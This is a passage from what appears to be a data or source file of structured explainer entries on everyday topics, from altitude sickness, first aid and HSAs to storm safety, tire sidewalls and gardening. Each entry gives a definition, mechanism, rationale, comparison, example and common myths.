    "ex": "a $5,000 European trip: comprehensive policy ~$200, covering medical ($100K+), evacuation ($500K+), trip cancellation, and delays. Skiing in the Alps and breaking a leg: hospital and helicopter rescue easily $30K, fully covered. Without insurance, that's a major financial hit",
    "mis": "people think their health insurance covers them abroad; most US plans (including Medicare) provide little or no foreign coverage. Another myth is that travel insurance covers any cancellation -- 'cancel for any reason' (CFAR) policies cost more and reimburse only 50-75%. Standard policies cover only listed reasons (illness, death in family, employer requirement)",
}
T["altitude sickness"] = {
    "what": "a constellation of symptoms -- headache, nausea, fatigue, insomnia -- that can affect anyone ascending rapidly to high altitudes (usually >2500m / 8200ft). Severe forms (HACE: high-altitude cerebral edema, HAPE: high-altitude pulmonary edema) are life-threatening medical emergencies",
    "how": "atmospheric pressure drops with altitude, reducing partial pressure of oxygen. Tissues receive less oxygen until physiological adaptations -- increased breathing rate, more red blood cells, more efficient oxygen utilization -- compensate. Rapid ascent overwhelms acclimatization, causing acute mountain sickness (AMS)",
    "why": "altitude sickness disables tourists at popular destinations (Cusco, La Paz, Lhasa, Everest base camp, Colorado ski resorts). Knowing the prevention and recognition is essential for high-altitude trips. Severe forms kill ~10% of those affected without descent",
    "vs": "AMS (mild to moderate) shows headache, nausea, fatigue. HACE adds confusion, ataxia (coordination loss); HAPE adds severe shortness of breath even at rest, frothy cough. AMS typically resolves with rest and acclimatization; HACE and HAPE require immediate descent and medical care",
    "ex": "flying from sea level to Cusco (3400m): ~30% of visitors get AMS within 24 hours. Mitigation: arrive a day early to acclimatize at lower altitude, take Diamox (acetazolamide) prophylactically starting 24h before, avoid alcohol, hydrate well, and ascend gradually if continuing higher (Machu Picchu is actually 1000m lower)",
    "mis": "people think fitness prevents altitude sickness; physical conditioning has no effect on susceptibility -- in fact, fit people sometimes push too hard and worsen symptoms. Another myth is that you 'get used to it' immediately; full acclimatization takes weeks, and rapid ascent always carries risk",
}
T["reading a topographic map"] = {
    "what": "a topographic map represents terrain elevation through contour lines, where each line connects points of equal elevation. Spacing between contours indicates slope steepness; closely spaced lines mean steep terrain, widely spaced lines mean gentle slope. Standard maps include grid coordinates, magnetic declination, and symbols for water, vegetation, and structures",
    "how": "each contour line is labeled with elevation; the contour interval (typically 20, 40, or 100 feet depending on scale) is noted in the map's legend. Reading a topo: identify elevation changes, recognize landforms (V-shapes pointing uphill indicate streams, concentric circles indicate hills/depressions), and use grid coordinates with a compass and declination to navigate",
    "why": "topographic maps remain essential for backcountry navigation where GPS may fail (battery dead, cloud cover, dense canopy). They reveal terrain features GPS apps don't easily convey -- gradients, drainage patterns, viewpoints. Search-and-rescue, surveying, hiking, and military planning all depend on them",
    "vs": "compared with road maps (which show transportation), topos show terrain. Compared with satellite imagery (which shows surface texture), topos abstract elevation explicitly via contours. Modern apps (Gaia GPS, CalTopo) combine topos with satellite, hiking trails, and GPS -- but reading the underlying topo is still the foundational skill",
    "ex": "planning a hike from a 4000ft trailhead to a 7000ft summit: the topo shows 3000ft elevation gain over 4 miles of trail, with contour spacing tightening near a steep section between miles 2 and 3. The route crosses two streams (V-shaped contours pointing uphill) and skirts a cliff (contours nearly vertical)",
    "mis": "people think GPS replaces map reading; GPS shows your location but doesn't predict the terrain ahead. Another myth is that contour intervals are universal; intervals vary by map scale and region (alpine maps often use 100ft, urban topos may use 5ft). Always check the legend",
}
T["reading nutrition labels"] = {
    "what": "nutrition labels (in the US, the FDA-regulated 'Nutrition Facts' panel) display serving size, calories, macronutrients, micronutrients, and ingredient list for packaged food. They enable informed dietary choices when read carefully and with awareness of common pitfalls",
    "how": "start with serving size and servings per container -- many packages contain multiple servings, so the calorie count reflects one serving, not the whole package. Check macronutrients (fat, carbs, protein), added sugars (separated from total sugars on US labels since 2020), and sodium. Ingredient list is sorted by weight (highest first)",
    "why": "informed reading helps manage weight, blood sugar, blood pressure, and dietary restrictions. Marketing claims on the front of packages ('low fat', 'all natural', 'multi-grain') often mislead; the nutrition panel and ingredient list reveal what's actually inside",
    "vs": "compared with restaurant menus (which often lack detailed nutrition info), packaged foods have standardized labels. Compared with European labels (which use per-100g and traffic-light systems), US labels use serving sizes that can be unrealistically small to make numbers look better",
    "ex": "a 'multigrain' bread label: serving size 1 slice (28g), 80 calories, 1g fat, 16g carbs, 3g fiber, 2g sugar, 3g protein. Ingredients: 'enriched wheat flour, water, sugar, oat fiber, soybean oil...' -- enriched white flour comes first, meaning this is mostly white bread with multigrain marketing",
    "mis": "people skip the serving size and underestimate intake by 2-4x for snack foods. Another myth is that 'organic' or 'natural' implies healthy -- organic sugar is still sugar. Reading labels is essential because front-of-package claims are marketing, not nutrition",
}
T["basic first aid (CPR, choking, bleeding)"] = {
    "what": "essential immediate care that can keep someone alive until professional help arrives. Core skills include CPR for cardiac arrest, the Heimlich maneuver for choking, direct pressure for severe bleeding, and recovery position for unconscious breathing victims. Bystander first aid significantly improves survival in many emergencies",
    "how": "for adult cardiac arrest: call 911, start chest compressions in the center of the chest at 100-120/min and 2-2.4 inches deep, push hard and fast. Use an AED if available. For choking: 5 back blows alternating with 5 abdominal thrusts. For severe bleeding: direct firm pressure with cloth; tourniquet if pressure fails on a limb",
    "why": "cardiac arrest survival drops 7-10% per minute without CPR; bystander CPR doubles or triples survival rates. Choking and severe bleeding can kill within minutes. Basic skills learned in a 4-hour class can save lives -- including those of family members at home, where most cardiac arrests occur",
    "vs": "compared with awaiting professionals, immediate bystander action dramatically improves outcomes. Compared with attempting advanced procedures (medications, IVs), the basics any layperson can perform are the highest-leverage interventions. Hands-only CPR (no rescue breaths) is now recommended for untrained bystanders",
    "ex": "an adult collapses in a restaurant. You call 911, locate the AED on the wall, and begin chest compressions. The AED instructs you to apply pads and shock; you do. By the time paramedics arrive 6 minutes later, you've done 5 minutes of compressions and one shock. Survival probability has tripled vs no bystander intervention",
    "mis": "people fear breaking ribs with CPR; broken ribs are common and not the worst outcome compared to death. Another myth is that the Heimlich is for unconscious victims -- if they go unconscious, you transition to CPR. Yet another: a tourniquet is a last resort -- modern guidance is to use one early for severe limb hemorrhage",
}


T["reading a thermostat schedule"] = {
    "what": "a thermostat schedule is a programmed set of temperature setpoints for different times of day and days of the week. It automates heating and cooling so the home is comfortable when occupied and saves energy when unoccupied or when occupants are sleeping",
    "how": "typical schedules have 4 daily periods: wake, leave, return, sleep. For winter heating: 68F at wake (6 AM), 60F at leave (8 AM), 68F at return (5 PM), 62F at sleep (10 PM). Summer cooling reverses: cooler when home and awake, warmer when away or sleeping. Smart thermostats learn these patterns automatically",
    "why": "schedules can cut HVAC energy 10-20% versus a constant setpoint. The DOE estimates ~1% savings per degree of setback over 8 hours. For a household spending $2000/year on HVAC, that's $200-400 saved annually with no comfort cost",
    "vs": "compared with manual adjustment, schedules eliminate forgotten changes. Compared with leaving the thermostat at one temperature, scheduled setbacks save without sacrificing comfort during occupied hours. Smart thermostats add geofencing (off when phone leaves geofence) and learning (adapts to actual patterns)",
    "ex": "winter weekday schedule on a smart thermostat: 68F starting 6 AM, drops to 60F at 8 AM (after kids are at school), back to 68F at 4:30 PM (anticipating arrival), drops to 64F at 10:30 PM. Weekend: warmer baseline since people are home. Combined with a heat pump, monthly bills drop ~$50 in cold months",
    "mis": "people think setting back the thermostat 'wastes' energy on the recovery period; the energy saved during setback far exceeds recovery cost for periods longer than ~2 hours. Another myth is that one constant temperature is most efficient; constant setpoints waste energy when no one's home or awake",
}
T["calculating tip and tax mentally"] = {
    "what": "quick mental arithmetic for restaurant and retail situations. US sales tax is typically 6-9.5% varying by location; restaurant tipping conventions are 15-22% in most regions. Mental shortcuts let you estimate totals and verify charges without phones",
    "how": "for tax (~8-10%), shift the decimal one place left to get 10%, then adjust slightly. For tip, two common methods: double the tax (works in 8-10% tax states for ~16-20% tip); or take 10% (decimal shift) and add half (15%) or double (20%). Round to easy numbers",
    "why": "mental math saves time and reduces awkwardness when splitting bills, calculating totals before swiping, and verifying charges. It also builds numerical intuition that helps with budgeting, deal evaluation, and unit pricing",
    "vs": "compared with phone calculators (always available but slower in social settings), mental math is faster and signals competence. Compared with rounded estimates (round bill to nearest 10, take percentages), exact mental math improves with practice",
    "ex": "$73.40 restaurant bill: 10% is $7.34, doubled is $14.68 (~20% tip), so total ~$88. Or split with 4 people: $88/4 = $22/person. Quick verification of bill: order subtotal $65, sales tax 8% should be ~$5.20, totaling $70.20. Doesn't match? Check the bill",
    "mis": "people think they need exact precision; estimating to the nearest dollar is plenty for tipping. Another myth is that tip should be calculated on the post-tax total; etiquette traditionally calculates on pre-tax subtotal, though post-tax is acceptable",
}
T["reading a credit card statement"] = {
    "what": "a credit card statement summarizes account activity for one billing period: charges, payments, fees, interest, current balance, minimum payment, and payment due date. Statements also detail rewards earned, available credit, and any disputes or adjustments",
    "how": "key fields: previous balance, payments and credits, new charges, fees, interest charged, new balance, minimum payment, payment due date. Rewards balance and APRs are typically separate sections. Compare the running list of charges to what you actually purchased to catch fraud and billing errors",
    "why": "reviewing statements catches unauthorized charges, billing errors, and recurring subscriptions you forgot. It also lets you track spending categories, plan payments to avoid interest, and confirm rewards earned. Many fraudulent charges go unnoticed because cardholders don't review statements",
    "vs": "compared with online transaction lists (real-time but transient), statements are formal records that protect dispute rights. Compared with bank account statements, credit card statements add interest, minimum payment terms, and rewards. Federal law gives 60 days from statement date to dispute charges",
    "ex": "monthly statement shows previous balance $0, new charges $1500 (groceries, dining, utilities), payment due $1500 minimum is $25. Paying minimum: at 21% APR, you'd carry the balance ~9 years and pay ~$1700 in interest. Paying full $1500: $0 interest. Reading the minimum payment table is a wake-up call",
    "mis": "people think paying the minimum 'maintains good standing'; it does technically, but the interest dwarfs principal payments. Another myth is that statement balance equals current balance; statement balance reflects activity through the close date and may differ from current balance after subsequent purchases",
}
T["HSAs vs FSAs"] = {
    "what": "two US tax-advantaged accounts for healthcare expenses. HSA (Health Savings Account) requires a high-deductible health plan and is owned by you, with contributions rolling over indefinitely. FSA (Flexible Spending Account) is employer-sponsored, has a use-it-or-lose-it rule, and limited rollover",
    "how": "HSA: contribute pre-tax (2024 limits $4150 self / $8300 family), invest the balance tax-free, withdraw tax-free for medical expenses. FSA: elect annual contribution at open enrollment ($3200 limit for 2024), use for medical expenses, lose unused funds (or up to ~$640 rollover) at year end",
    "why": "HSAs are arguably the best tax-advantaged accounts in US tax law: triple tax-free (deductible contributions, tax-free growth, tax-free withdrawals for medical). After 65, withdrawals for non-medical expenses are taxed but not penalized -- effectively a traditional IRA with extra benefits",
    "vs": "HSA: portable, rolls over forever, can invest, requires HDHP, age-55 catch-up contributions. FSA: use-it-or-lose-it (mostly), no HDHP requirement, lower contribution limit, immediate access to full elected amount on day one. Limited Purpose FSAs work alongside HSAs for dental and vision only",
    "ex": "max-funding an HSA at $4150/year for 30 years, invested at 7%: ~$418K tax-free for medical expenses or as a retirement account. Same amount in a taxable account: ~$280K after taxes. The HSA's tax advantages compound dramatically over decades",
    "mis": "people think HSAs are 'use it or lose it' like FSAs; HSA balances roll over forever and can be invested. Another myth is that HSAs are only for healthcare expenses -- after 65 they function as traditional IRAs for any expense, while remaining tax-free for medical",
}
T["life insurance types (term vs whole)"] = {
    "what": "two main categories of life insurance. Term life provides a death benefit for a specified period (10, 20, 30 years) for a fixed premium; if you outlive the term, coverage ends. Whole life provides lifelong coverage with a savings component (cash value) that grows tax-deferred",
    "how": "term life: pay $30/month for $500K coverage, 20-year term. Whole life: pay $400/month for the same coverage, with part going to insurance and part to cash value that you can borrow against or surrender. Universal and variable life are flexible variants of permanent insurance",
    "why": "life insurance protects dependents from income loss if you die during your peak earning years. Term insurance provides cheap coverage during the years you have dependents. Whole life is sold heavily because it earns large commissions, but it's rarely the right choice for most middle-income families",
    "vs": "term: cheap, simple, time-limited. Permanent (whole/universal/variable): expensive, complex, lifelong, with investment component. Most personal-finance experts recommend term plus separate investing ('buy term and invest the difference') as more efficient than permanent for most situations",
    "ex": "30-year-old non-smoker with 2 kids: 20-year, $1M term policy might cost $30/month. The same coverage in whole life costs $700/month with $670 going to cash value. Investing the $670 difference in an index fund typically beats the whole-life cash value by a wide margin over 20 years",
    "mis": "people think whole life is an investment; the returns are typically poor and fees are high. Another myth is that you need life insurance forever -- at retirement, with kids grown and home paid off, the need usually disappears. Buy enough term to cover the years dependents need you, then let it expire",
}
T["rent vs buy decisions"] = {
    "what": "the personal-finance question of whether to rent housing or buy. The answer depends on local price-to-rent ratios, expected duration in the home, mortgage rates, opportunity cost of the down payment, and personal flexibility preferences",
    "how": "compare total monthly cost of buying (mortgage, taxes, insurance, maintenance, opportunity cost of down payment) against renting. Use rent vs buy calculators that account for transaction costs, appreciation assumptions, and time horizon. Generally, buying makes sense for stays of 5+ years in markets where price-to-rent ratios are reasonable",
    "why": "this is among the largest financial decisions most people make. A poor decision -- buying in a high-priced market then moving in 2 years -- can cost tens of thousands. A good one -- buying when prices are reasonable and staying long-term -- builds wealth through equity and appreciation",
    "vs": "buying: equity buildup, locked-in housing costs, appreciation upside, tax benefits, illiquidity, transaction costs. Renting: flexibility, no maintenance burden, no concentrated asset risk, opportunity to invest down payment, no equity. Both are reasonable choices in different circumstances",
    "ex": "in a city with $3,000 rent and $750,000 home prices, the price-to-rent ratio is 21x -- on the high end. Mortgage at 7% is ~$5,000/month before maintenance and taxes. Renting and investing the $250K down payment may yield more wealth over 5 years than buying. Time horizon and local trends matter enormously",
    "mis": "the universal myth: 'renting is throwing money away'. Both rent and the interest portion of a mortgage are pure cost. The wealth-building part of buying is principal payment plus appreciation, weighed against opportunity cost of the down payment. Markets and time horizons make either rational",
}
T["negotiating salary"] = {
    "what": "the conversation around compensation when accepting a job offer or seeking a raise. Includes base pay, equity, bonus, signing bonus, benefits, vacation, remote-work flexibility, and start date. Skilled negotiation typically increases offers by 5-15%, compounding over an entire career",
    "how": "research market ranges (Levels.fyi, Glassdoor, Levels for tech), know your BATNA (best alternative -- another offer or staying put), let the employer name a number first if possible, counter with a specific number based on data, negotiate the full package not just base, get final offers in writing",
    "why": "salary negotiation has unusually high return per hour invested. A successful negotiation that adds $10K to base salary compounds: same percentage raises off a higher base, higher 401(k) match, higher Social Security earnings credit. Over a career, $10K more starting salary can mean $200K-500K more lifetime",
    "vs": "compared with avoiding negotiation (accepting initial offers), even modest negotiation usually succeeds because employers have a salary band with room. Compared with aggressive demands, collaborative framing ('I'm excited about the role; based on the market and my experience, I was hoping for...') maintains the relationship",
    "ex": "tech company offers $160K base, $20K signing, $400K equity over 4 years. Counter with $175K base citing competing offer plus market data. Final negotiation lands at $170K base, $30K signing, same equity. Net gain: $10K base (compounding) plus $10K signing -- maybe $50K over 5 years",
    "mis": "people fear negotiation will rescind the offer; rescissions are extremely rare except for unprofessional conduct. Another myth is that negotiating is only for executives; the same dynamics apply at every level, and early-career professionals leave the most on the table",
}
T["building a resume"] = {
    "what": "a resume is a concise professional summary used to apply for jobs. Modern resumes are typically one page (or two for senior roles), focus on accomplishments rather than responsibilities, quantify impact where possible, and are tailored to each role",
    "how": "structure: contact info, optional summary, experience (most recent first), education, skills. For each role, list 3-5 bullets emphasizing accomplishments with measurable outcomes ('Led team that reduced infrastructure costs by 40% / $2M annually'). Use action verbs (built, led, reduced, launched). Tailor keywords to the job posting for ATS",
    "why": "the resume is often the only document between you and an interview. Recruiters spend ~6 seconds on initial scans. A clear, accomplishment-focused resume that matches the role's requirements dramatically increases callback rates compared with responsibility-focused or generic resumes",
    "vs": "compared with CVs (academic, multi-page, comprehensive), resumes are concise and selective. Compared with LinkedIn (extensive, ongoing), resumes are tailored and snapshot. Both should align in content but diverge in length and purpose",
    "ex": "weak bullet: 'Responsible for managing a team and reporting on metrics'. Strong bullet: 'Led team of 7 engineers; shipped product migration that reduced page-load time by 60% and increased conversion by 15%, generating $4M incremental annual revenue'. Same role, vastly different impact signaling",
    "mis": "people overstuff resumes with every responsibility ever held; selective curation focused on the target role outperforms exhaustive listing. Another myth is that a fancy template stands out; clean, scannable, well-formatted text beats designer templates that confuse ATS parsers",
}
T["networking effectively"] = {
    "what": "building and maintaining professional relationships that create mutual value over time. Effective networking is not about collecting contacts; it's about cultivating a small number of meaningful relationships with reciprocity, regular touch, and genuine interest in others",
    "how": "make connections through shared interests, work, school, conferences, and warm introductions. Stay in touch via occasional helpful gestures (sharing relevant articles, making intros, congratulating on milestones) rather than only when you need something. Give before you ask. Quality compounds; quantity rarely does",
    "why": "the majority of jobs at experienced levels are filled through networks rather than public postings. Beyond job search, networks provide advice, perspective, partners, customers, investors, and friendships. Investments in networking compound over decades",
    "vs": "compared with cold applications, network referrals dramatically increase callback and offer rates. Compared with transactional networking (only reach out when you need something), relationship-based networking builds trust that pays back when you most need it. LinkedIn is a tool, not a strategy",
    "ex": "after a great conversation at a conference, send a follow-up note within 48 hours referencing something specific you discussed. Six months later, share an article relevant to their work. A year later, when you're job hunting, that contact is happy to help -- because the relationship is genuine, not transactional",
    "mis": "introverts think networking isn't for them; deep one-on-one relationships are exactly what most introverts can do well. Another myth is that you need lots of contacts; ten warm relationships in your field beat a thousand LinkedIn connections you've never spoken with",
}
T["intermittent fasting"] = {
    "what": "an eating pattern that cycles between periods of eating and fasting. Common protocols include 16:8 (eat within 8 hours, fast 16), 5:2 (5 normal days, 2 very low-calorie days), and OMAD (one meal a day). The timing structure, not specific foods, defines IF",
    "how": "during fasting, insulin drops, glycogen depletes, and the body shifts toward fat utilization. Some studies suggest benefits beyond calorie restriction (autophagy, metabolic flexibility), though evidence is mixed. Many practitioners also report appetite simplification and time savings",
    "why": "for some people, IF is an easier way to manage caloric intake than continuous calorie counting -- you eat normally during eating windows and don't think about food during fasting windows. Studies show modest weight loss and metabolic improvements, generally similar to traditional calorie restriction",
    "vs": "compared with traditional calorie restriction, IF tends to produce similar weight loss in head-to-head trials. Some people find IF easier; others find it disordered or unsustainable. Compared with extended fasting (24+ hours), daily 16:8 is the most evidence-supported and sustainable",
    "ex": "a 16:8 schedule: eat between noon and 8 PM, no calories outside that window (water, black coffee, tea allowed). Skip breakfast or push it to noon, eat lunch and dinner normally. After 2-4 weeks, hunger reorganizes around the eating window. Modest weight loss for most who maintain caloric awareness",
    "mis": "people think IF is metabolically magical; it's largely a calorie-restriction tool with a different structure. Another myth is that breakfast is essential -- there's no strong evidence skipping it harms most adults, despite decades of cereal-industry messaging. Pregnant women, those with eating disorders, or some metabolic conditions should avoid IF",
}
T["the keto diet"] = {
    "what": "a very low-carbohydrate, high-fat diet that shifts the body into ketosis -- burning fat for fuel and producing ketone bodies. Typical macros: <50g carbs/day, ~70-80% fat, ~20-25% protein. Originally developed in the 1920s for epilepsy treatment",
    "how": "with carbohydrate intake very low, blood glucose drops; insulin drops; the liver converts fat into ketones (beta-hydroxybutyrate, acetoacetate) that the brain and muscles can use. The body adapts over 1-3 weeks (the 'keto flu' is the adaptation period). Strict adherence is required; even small carb intake leaves ketosis",
    "why": "keto produces rapid initial weight loss (much from glycogen-bound water), can dramatically improve seizure control in drug-resistant epilepsy, and shows promise in some metabolic conditions. For general weight loss, head-to-head trials with other low-calorie diets show similar long-term outcomes -- adherence matters more than diet type",
    "vs": "compared with low-fat diets (high carb, low fat), keto inverts the macro distribution. Compared with Mediterranean diet (moderate carbs from whole foods), keto is more restrictive and harder to sustain long-term. Compared with carnivore (meat-only), keto allows non-starchy vegetables, nuts, seeds, dairy",
    "ex": "a ketogenic day: bacon and eggs (no toast) for breakfast, large salad with grilled chicken and olive oil for lunch, salmon with broccoli and butter for dinner, macadamia nuts for snacks. Total carbs <30g. Within 1-2 weeks, ketones rise; appetite often decreases naturally",
    "mis": "people think any low-carb meal puts them in ketosis; only sustained very-low-carb intake does. Another myth is that keto is universally beneficial; it can elevate LDL in some people, isn't safe for type 1 diabetics without medical supervision, and is hard to sustain socially",
}
T["macronutrients and micronutrients"] = {
    "what": "macronutrients are nutrients we need in large amounts: carbohydrates, proteins, and fats (plus water and alcohol). Micronutrients are vitamins and minerals needed in small amounts but essential for proper function. Both are required; deficiencies in either cause health problems",
    "how": "macros provide energy: carbs and proteins ~4 calories/g, fats ~9 calories/g. Each serves structural and functional roles -- protein for tissue building, fat for hormone production and absorption of fat-soluble vitamins, carbs for fuel. Micronutrients act as cofactors in countless biochemical reactions",
    "why": "balanced macro intake supports energy, satiety, and metabolic health. Adequate micronutrients prevent deficiency diseases (scurvy, beriberi, rickets) and support immune function, bone health, and cognition. Modern Western diets are often macro-sufficient but micronutrient-poor due to processed foods",
    "vs": "compared with focusing on macros alone (calories, protein), tracking food quality captures micronutrients too. Whole foods deliver micronutrients packaged with macros and fiber; supplements can fill gaps but don't replicate whole-food benefits",
    "ex": "a 2000-calorie balanced day: protein 100-150g (25-30%), fat 65-80g (~30-35%), carbs 200-275g (~40-50%) -- roughly the Mediterranean pattern. Achieving this through colorful vegetables, fruits, whole grains, lean proteins, and healthy fats automatically delivers most micronutrients without supplementation",
    "mis": "people think micronutrient supplementation is interchangeable with food sources; whole-food nutrients work in synergistic combinations supplements can't replicate. Another myth is that high-protein diets harm kidneys; in healthy people, evidence does not support this claim",
}
T["reading a weather radar map"] = {
    "what": "weather radar uses microwave pulses to detect precipitation and wind. Standard radar maps display precipitation intensity in colors (light green to red) and indicate motion via animated loops. Doppler radar adds wind velocity, enabling tornado detection",
    "how": "radar transmits a microwave pulse and measures the reflection from raindrops, snowflakes, hail, or insects. Reflection intensity (reflectivity, dBZ) maps to colors. Doppler shifts in returned signals reveal motion toward or away from the radar -- indicating wind direction and strong rotation in tornadoes",
    "why": "radar gives 5-15 minutes of warning for severe weather, time enough to seek shelter from tornadoes or move outdoor events under cover. Apps like RadarScope, Windy, and the National Weather Service site put professional-grade radar data on every smartphone",
    "vs": "compared with satellite imagery (cloud cover from above), radar shows precipitation specifically and at much higher resolution. Compared with surface observations, radar reveals what's coming, not what's already arrived. Modern phased-array radars update every minute with detailed velocity data",
    "ex": "a green band approaching from the west indicates light rain; yellow and orange indicate moderate to heavy; red and purple indicate intense rain or hail. A small bright reflectivity 'hook echo' with rotation visible on velocity radar is a classic tornado signature -- shelter immediately",
    "mis": "people think bright colors always mean dangerous weather; some bright returns are non-meteorological (chaff, ground clutter, biological -- yes, radar can see large bird and insect movements). Another myth is that radar gaps mean clear weather; gaps in coverage and beam blockage by mountains can hide real precipitation",
}
T["storm safety"] = {
    "what": "preparation and response practices for severe weather including thunderstorms, tornadoes, hurricanes, blizzards, and flooding. Specific actions vary by storm type but share principles: monitor warnings, prepare supplies in advance, shelter appropriately, avoid unnecessary risks during the event",
    "how": "tornado: shelter in lowest interior room, away from windows, ideally a basement or storm shelter. Hurricane: evacuate if ordered; otherwise shelter in interior away from windows, with food, water, batteries for ~3-7 days. Lightning: when thunder roars, go indoors -- shelter in a building or fully enclosed vehicle, never under trees",
    "why": "preparation reduces casualties dramatically. Tornado outbreaks kill ~70 people annually in the US -- a number that would be much higher without warning systems and shelter behavior. Most lightning fatalities are people who continued outdoor activities after thunder. Most flood deaths involve driving into flooded roads",
    "vs": "tornado warning (imminent threat) vs tornado watch (conditions favorable) -- different urgency. Hurricane categories scale wind speed but storm surge causes the most deaths regardless of category. Flash floods kill more than river floods because they arrive without warning",
    "ex": "a tornado warning at 11 PM in central Oklahoma: phone alert sounds, you and family move to the basement bathroom (interior, no windows), bring helmets and shoes (debris injuries are common), monitor weather radio, wait until the all-clear. The 5 minutes of inconvenience could save your life",
    "mis": "people seek shelter under highway overpasses in tornadoes -- this concentrates wind and is more dangerous than open ground. Another myth is that opening windows equalizes pressure -- it doesn't help and wastes precious shelter time. Yet another: 'I'll outrun the tornado' -- driving in tornado conditions is extremely dangerous",
}
T["earthquake preparedness"] = {
    "what": "actions taken before, during, and after an earthquake to reduce injury and damage. Includes securing heavy objects, learning Drop-Cover-Hold-On, maintaining supplies for 7-14 days of self-sufficiency, and knowing utility shutoffs",
    "how": "before: bolt water heaters and tall furniture to walls, secure pictures with closed hooks, identify safe spots in each room. During: Drop to the ground, take Cover under sturdy furniture or against an interior wall, Hold On until shaking stops. After: check for injuries, gas leaks, structural damage; expect aftershocks",
    "why": "in earthquake-prone regions (California, Oregon, Washington, Alaska, Japan, Chile), major earthquakes are inevitable on geological timescales. Preparation reduces injuries from falling objects (the most common cause), improves survival in collapsed buildings, and shortens recovery after the event",
    "vs": "compared with hurricane preparation (days of warning), earthquakes strike with no warning (seconds at best from early-warning systems). Compared with tornadoes (regional, predictable seasons), earthquakes can occur any time. Earthquake-specific preparation (anchoring, water storage) differs from general emergency prep",
    "ex": "Bay Area resident: water heater anchored, gas shutoff wrench at the meter, 14 gallons of water per person stored, food rotation supply for two weeks, hand-crank radio, family meeting plan with out-of-state contact. After a magnitude-6 quake: immediate self-sufficiency for days while utilities restore",
    "mis": "people stand in doorways during quakes -- modern doorways are no stronger than walls and you may be hit by a swinging door. Another myth is that running outside is safest -- falling debris (glass, brick, signs) is the largest danger near buildings during shaking. Drop, Cover, Hold On where you are",
}
T["basic car maintenance (oil, tires, brakes)"] = {
    "what": "routine attention that extends vehicle life, prevents breakdowns, and maintains safety. Core items include engine oil changes, tire pressure and rotation, brake inspection, fluid checks (coolant, brake, transmission), and battery condition",
    "how": "oil: change per manufacturer schedule (typically 5,000-10,000 miles for synthetic). Tires: check pressure monthly with a gauge (cold), rotate every 5,000-7,500 miles, inspect tread depth (penny test or wear indicators). Brakes: listen for squeal or grinding, inspect pads visually through the wheels every oil change",
    "why": "regular maintenance prevents far more expensive repairs. A $50 oil change extends engine life by years; a $20 tire rotation doubles tire life. Brake pads at $200 prevent rotor replacement at $600. Total maintenance investment is dwarfed by the repair costs avoided",
    "vs": "modern cars need far less maintenance than older models -- electronic ignition replaced spark-plug rituals, fuel injection eliminated carb adjustment. But basics remain: oil, tires, brakes. Tire pressure is the single highest-leverage check most people skip",
    "ex": "monthly tire pressure check (3 minutes with a $5 gauge): proper inflation (per door-jamb sticker, typically 32-36 psi) extends tire life by ~20%, improves fuel economy by ~3%, and prevents blowouts. A neglected tire at 22 psi runs hot, wears the edges, and may fail catastrophically",
    "mis": "people rely on TPMS warnings; the system only triggers at significant under-inflation (~25% low). By then you've already lost economy and tire life. Another myth is that synthetic oil is unnecessary; modern engines specifically require it, and the longer interval often offsets the higher per-quart cost",
}
T["reading a tire sidewall"] = {
    "what": "the markings on a tire's sidewall encode size, load capacity, speed rating, construction details, manufacturing date, and treadwear/traction/temperature ratings. Decoding the sidewall lets you choose compatible replacements and understand what your tires are designed for",
    "how": "the size code (e.g., P225/55R17 95H) means: passenger tire, 225mm width, 55 aspect ratio (sidewall is 55% of width), Radial construction, 17-inch wheel diameter, load index 95 (1521 lbs max), speed rating H (130 mph). DOT date code (4-digit) is week and year of manufacture",
    "why": "matching new tires to your vehicle's specifications matters for safety, performance, and warranty compliance. Reading the date prevents buying old stock (rubber degrades after ~6 years even unused). Understanding load and speed ratings prevents overloading or exceeding tire capabilities",
    "vs": "compared with the door-jamb sticker (which gives the manufacturer's recommended tires for your vehicle), sidewall markings show what you actually have. Compared with treadwear ratings (UTQG: higher = longer wear), real-world tire life depends heavily on alignment, pressure, and driving style",
    "ex": "sidewall reads 235/45ZR18 94Y: 235mm width, 45 aspect ratio, Z and Y indicating high speed capability (>149 mph and 186 mph respectively), 18-inch wheel, 94 load index. DOT code 'XYZW 2823' means week 28 of 2023 -- about a year old, fresh stock",
    "mis": "people think the sidewall pressure (e.g., 'Max 51 psi') is the recommended pressure; it's the maximum the tire can safely hold. Use the door-jamb sticker for recommended pressure. Another myth is that aggressive treads are better -- they're noisier, less efficient, and rarely needed for daily driving",
}
T["gardening basics (sunlight, watering, soil)"] = {
    "what": "the foundational practices of growing plants well: matching plants to sun exposure, watering correctly, and providing healthy soil. Most plant failures trace to mismatch in one of these three rather than pests or disease",
    "how": "sun: 'full sun' = 6+ hours direct; 'part sun' = 4-6; 'shade' = <4. Water: most plants prefer deep infrequent watering (encouraging deep roots) over shallow daily watering. Soil: most vegetables and ornamentals want loamy, well-drained soil with organic matter and pH around 6.0-7.0",
    "why": "matching plants to conditions reduces watering, fertilizing, and pest pressure. A sun-loving plant in shade is leggy and weak; a shade-lover in sun scorches. Healthy soil supports beneficial microbes, retains moisture, and feeds plants without constant fertilizing",
    "vs": "compared with intensive maintenance (heavy fertilizing, daily watering, frequent pesticide), good site selection plus soil building is much less work and more sustainable. Compared with native plants (adapted to local conditions), exotic plants may need more support to thrive",
    "ex": "tomatoes need 6-8 hours of sun, well-drained slightly acidic soil, deep weekly watering (rather than daily shallow watering). Plant in compost-amended soil, mulch to retain moisture, water at the base in the morning. A plant correctly sited needs little intervention; one wrongly sited needs constant rescue",
    "mis": "people overwater because watering 'feels caring'; constantly soggy soil suffocates roots and breeds fungus. Another myth is that more fertilizer makes bigger plants -- excess nitrogen produces lush leaves with poor flowering and fruiting, and runoff pollutes waterways",
}
T["container gardening"] = {
    "what": "growing plants in containers (pots, planters, raised beds) instead of in the ground. Container gardening suits balconies, patios, rentals, and poor-soil sites, and gives precise control over soil quality, drainage, and movement of plants",
    "how": "choose containers with drainage holes; size to mature root spread (most vegetables need 5+ gallons). Use potting mix (not garden soil -- too dense). Water more often than in-ground (containers dry faster, especially terracotta). Fertilize regularly because nutrients leach with watering. Match plant choices to container size and sun exposure",
    "why": "container gardening makes growing food accessible for renters, urban dwellers, and people with bad native soil. It also enables seasonal flexibility (move tender plants indoors), pest avoidance (raise off ground), and customization (mix tropical and temperate plants on the same patio)",
    "vs": "compared with in-ground gardening, containers need more frequent watering, more fertilization, and have lower yields per plant. Compared with vertical gardens or hydroponics, containers are simpler and more forgiving for beginners. Self-watering containers (with reservoirs) reduce watering frequency",
